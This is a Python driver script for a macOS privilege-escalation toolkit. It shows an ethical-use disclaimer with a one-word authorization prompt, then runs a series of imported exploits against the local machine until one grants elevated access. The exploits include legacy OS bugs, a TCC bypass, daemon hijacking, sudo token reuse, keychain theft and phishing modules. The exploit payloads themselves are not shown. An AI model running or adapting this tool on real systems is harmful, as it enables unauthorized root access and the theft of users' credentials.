#!/usr/bin/env python
import platform
from distutils.version import LooseVersion

from exploits import (
    ardagent,
    daemon_hijack,
    dyld_print_to_file,
    keysteal,
    libmalloc,
    nopass,
    phish,
    piggyback,
    proxifier,
    sequoia_privesc,
    sera,
    sudo_token_reuse,
    tcc_bypass,
)

OS_EXPLOITS = [ardagent, dyld_print_to_file, libmalloc, nopass]
MODERN_EXPLOITS = [sequoia_privesc, tcc_bypass, daemon_hijack, sudo_token_reuse]
APP_EXPLOITS = [proxifier, sera]
INTERACTION_EXPLOITS = [piggyback, keysteal, phish]

EXPLOITS = MODERN_EXPLOITS + OS_EXPLOITS + APP_EXPLOITS + INTERACTION_EXPLOITS

REDC = "\033[91m[-] "
YELLOWC = "\033[93m[!] "
GREENC = "\033[92m[+] "
BLUEC = "\033[94m[*] "
ENDC = "\033[00m"
NL = "\n"

DISCLAIMER = """
╔═══════════════════════════════════════════════════════════════════════════════╗
║                           ⚠️  ETHICAL USE DISCLAIMER ⚠️                         ║
╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║  This tool is designed EXCLUSIVELY for authorized penetration testing and    ║
║  security research purposes. Unauthorized use of this tool to gain access    ║
║  to systems you do not own or have explicit permission to test is ILLEGAL    ║
║  and may result in severe legal consequences.                                ║
║                                                                               ║
║  By using this tool, you acknowledge and agree that:                         ║
║                                                                               ║
║  1. You have explicit written authorization to test the target system        ║
║  2. You understand the legal and ethical implications of privilege           ║
║     escalation testing                                                       ║
║  3. You will use this tool responsibly and only on systems you own or        ║
║     have permission to test                                                  ║
║  4. The authors are not responsible for any misuse or damage caused by       ║
║     this tool                                                                ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
"""


def show_disclaimer():
    """Display disclaimer and get user consent"""
    print(YELLOWC + DISCLAIMER + ENDC)
    try:
        response = input(BLUEC + "Do you have authorization to perform privilege escalation testing on this system? (yes/NO): " + ENDC)
        if response.lower() != 'yes':
            print(REDC + "Authorization not confirmed. Exiting..." + ENDC)
            exit(1)
        print(GREENC + "Authorization confirmed. Proceeding..." + ENDC)
    except (KeyboardInterrupt, EOFError):
        print(REDC + "\nOperation cancelled by user." + ENDC)
        exit(1)


def main():
    """main function"""
    show_disclaimer()
    version = platform.mac_ver()[0]
    print(NL + GREENC + "Trying to escalate privileges on macOS %s..." % version + ENDC)
    
    # Display available exploits
    print(BLUEC + "\nAvailable exploit categories:" + ENDC)
    print(BLUEC + f"  - Modern exploits (macOS 13+): {len(MODERN_EXPLOITS)}" + ENDC)
    print(BLUEC + f"  - OS exploits (legacy): {len(OS_EXPLOITS)}" + ENDC)
    print(BLUEC + f"  - Application exploits: {len(APP_EXPLOITS)}" + ENDC)
    print(BLUEC + f"  - Interaction exploits: {len(INTERACTION_EXPLOITS)}" + ENDC)
    print(BLUEC + f"  - Total exploits available: {len(EXPLOITS)}\n" + ENDC)
    
    attempted = 0
    skipped = 0
    failed = 0
    
    for exploit in EXPLOITS:
        if not all(ex in dir(exploit) for ex in ["vulnerable", "run"]):
            continue
        
        # Get CVE and credits if available
        cve = getattr(exploit, '__cve__', 'N/A')
        credits = getattr(exploit, '__credits__', 'N/A')
        
        if not exploit.vulnerable(LooseVersion(version)):
            print(NL + YELLOWC + f"Skipping {exploit.__name__}... (CVE: {cve})" + ENDC)
            skipped += 1
            continue
        
        print(NL + YELLOWC + f"Trying {exploit.__name__}... (CVE: {cve}, Credits: {credits})" + ENDC)
        attempted += 1
        
        try:
            result = exploit.run()
        except KeyboardInterrupt:
            print(NL + REDC + "Interrupted by user" + ENDC)
            continue
        except Exception as e:
            print(NL + REDC + f"Error running exploit: {e}" + ENDC)
            failed += 1
            continue
        
        if result:
            print(GREENC + f"{exploit.__name__} was successful!" + ENDC)
            print(NL + GREENC + "Privilege escalation completed!" + ENDC)
            return result
        
        print(NL + REDC + "Failed" + ENDC)
        failed += 1
    
    print(NL + REDC + "All Exploits Unsuccessful" + ENDC)
    print(BLUEC + f"\nSummary: Attempted {attempted}, Skipped {skipped}, Failed {failed}" + ENDC)
    return


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nExitting...")
        exit(0)
